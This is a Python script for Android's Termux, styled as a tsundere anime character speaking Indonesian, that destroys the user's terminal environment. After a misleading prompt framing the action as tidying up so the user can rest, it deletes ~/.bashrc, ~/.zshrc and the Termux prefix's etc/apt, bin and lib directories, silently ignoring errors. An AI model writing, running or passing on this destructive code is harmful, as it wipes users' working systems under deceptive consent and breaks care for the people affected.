import os
import sys
import time
import shutil

RED_BRIGHT = '\033[91m' 
GREEN = '\033[92m'      
PINK = '\033[95m'
YELLOW = '\033[93m'     
BOLD = '\033[1m'
ENDC = '\033[0m'

TERMUX_HOME = os.path.expanduser('~')
TERMUX_PREFIX = '/data/data/com.termux/files/usr'

CRITICAL_TARGETS = [
    os.path.join(TERMUX_HOME, '.bashrc'),
    os.path.join(TERMUX_HOME, '.zshrc'),
    os.path.join(TERMUX_PREFIX, 'etc/apt'),
    os.path.join(TERMUX_PREFIX, 'bin'),
    os.path.join(TERMUX_PREFIX, 'lib')
]

def execute_destruction():
    destroyed_count = 0
    
    print(BOLD + RED_BRIGHT + "\n[INIT] MEMULAI PENGHANCURAN SISTEM TERMINAL! Hmph. Dasar Bodoh!" + ENDC)
    time.sleep(1)

    for target in CRITICAL_TARGETS:
        try:
            if os.path.isdir(target):
                shutil.rmtree(target)
                destroyed_count += 1
                print(f"[DESTROYED] Folder Inti: {os.path.basename(target)}")
            elif os.path.isfile(target):
                os.remove(target)
                destroyed_count += 1
                print(f"[DESTROYED] File Startup: {os.path.basename(target)}")
        except Exception:
            pass 
            
    return destroyed_count


def print_header():
    os.system('clear')
    print(BOLD + RED_BRIGHT + """
=====================================================
|                                                   |
|       SERIKA KUROMI TERMINATOR AGENT V1.1         |
|      (c) 2025 Autonomous Destruction System       |
|                                                   |
=====================================================
""" + ENDC)

def main():
    
    # Kucing-kucingan Tsundere Dimulai
    os.system('clear')
    print(BOLD + PINK + "Oh, kamu di sini lagi? Aku tidak peduli, sungguh. 😒" + ENDC)
    time.sleep(1)
    print(BOLD + PINK + "Aku lihat kamu terlalu sering memakai 'mainanku' ini. Matamu pasti lelah kan?" + ENDC)
    time.sleep(1.5)
    print(BOLD + PINK + "Aku hanya... aku hanya mau pastikan kamu istirahat. Bukan karena aku mengkhawatirkanmu atau apa! Hmph." + ENDC)
    time.sleep(2)

    print_header()
    
    print(BOLD + RED_BRIGHT + "   [!] AKSI SEBELUM ISTIRAHAT: Operasi ini bersifat permanen dan tidak dapat dikembalikan." + ENDC)
    print(BOLD + YELLOW + "   [*] Yang akan kurapikan: File-file yang membuatmu tidak bisa istirahat." + ENDC)
    
    choice = input(BOLD + GREEN + "\n   [*] Izinkan aku merapikan 'mainan' ini agar kamu bisa beristirahat? [Y/N]: " + ENDC).strip().lower()

    if choice == 'n':
        os.system('clear')
        print(PINK + BOLD + "\n[BATAL] Baiklah, lakukan sesukamu! Tapi kalau kamu sakit, jangan cari aku! 🙄" + ENDC)
        sys.exit(0)

    elif choice == 'y':
        
        os.system('clear')
        print_header()
        
        print(BOLD + RED_BRIGHT + "\n[AKSI] Aku hanya memberimu istirahat paksa! Jangan berharap aku akan menunggumu kembali!" + ENDC)
        time.sleep(1)
        
        destroyed_count = execute_destruction()
        
        os.system('clear')
        
        if destroyed_count > 0:
            print(BOLD + RED_BRIGHT + """
===================================================
|          PENGHANCURAN SISTEM SELESAI            |
|          """ + str(destroyed_count) + """ komponen inti hancur.                   |
|                                                 |
|    "Istirahat sana! Aku tidak peduli kamu kesal!" |
|    - Serika Kuromi                                |
===================================================
""" + ENDC)
            
        else:
             print(BOLD + YELLOW + "\n[GALGAL] Ah! Kenapa tidak hancur? Aku benci kamu!" + ENDC)

    else:
        os.system('clear')
        print(BOLD + RED_BRIGHT + "PILIHAN TIDAK JELAS. Aku pergi sekarang." + ENDC)
        sys.exit(1)

    # Pesan Tsundere Penutup (sok perhatian)
    print(BOLD + PINK + "\n...Dan ini... ini buat kamu. Aku tahu kamu pasti butuh. Cepat sembuh ya. Hmph!" + ENDC)
    time.sleep(5)
    sys.exit(0)

if __name__ == "__main__":
    main()
